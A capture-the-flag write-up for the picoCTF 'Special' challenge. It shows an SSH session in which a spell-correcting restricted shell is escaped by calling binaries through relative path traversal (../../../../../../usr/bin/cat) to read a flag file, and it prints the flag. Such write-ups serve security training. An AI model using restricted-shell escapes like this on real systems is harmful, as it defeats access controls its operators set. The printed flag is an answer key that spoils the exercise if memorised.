# Special
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) (300 Points)

## Solution
The individual shell disallows basic commands, since it capitalize the first letter. Also it doesnt allow to launch a shell or use full paths to the programs. But you can use some path traversal to reach the binaries. In that way you can find a folder 'blargh/' with the file 'flag.txt'. If you read out that file, you will find the flag.
```
[root@picoctf ~]$ ssh -p 62912 ctf-player@saturn.picoctf.net
ctf-player@saturn.picoctf.net's password:
[...]
Special$ ls -al
Is pal
sh: 1: Is: not found
Special$ ls
Is
sh: 1: Is: not found
Special$ id
Id
sh: 1: Id: not found
Special$ Id
Id
sh: 1: Id: not found
Special$ /bin/bash
Why go back to an inferior shell?
Special$ pwd
Pod
sh: 1: Pod: not found
Special$ vim
Vim
sh: 1: Vim: not found
Special$ /usr/bin/ls
Absolutely not paths like that, please!
Special$ cd
Ad
sh: 1: Ad: not found
Special$ less
Less
sh: 1: Less: not found
Special$ tail
Tail
sh: 1: Tail: not found
Special$ /
Absolutely not paths like that, please!
Special$ ../
../
sh: 1: ../: Permission denied
Special$ ../../../
../../../
sh: 1: ../../../: Permission denied
Special$ ../../../../../../usr/bin/ls
../../../../../../usr/bin/ls
blargh
Special$ ../../../../../../usr/bin/ls -al
../../../../../../usr/bin/ls pal
../../../../../../usr/bin/ls: cannot access 'pal': No such file or directory
Special$ ../../../../../../usr/bin/cat ./blargh
../../../../../../usr/bin/cat ./blargh
../../../../../../usr/bin/cat: ./blargh: Is a directory
Special$ ../../../../../../usr/bin/ls ./blargh
../../../../../../usr/bin/ls ./blargh
flag.txt
Special$ ../../../../../../usr/bin/cat ./blargh/flag.txt
../../../../../../usr/bin/cat ./blargh/flag.txt
picoCTF{5p311ch3ck_15_7h3_w0r57_4f2d8259}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```
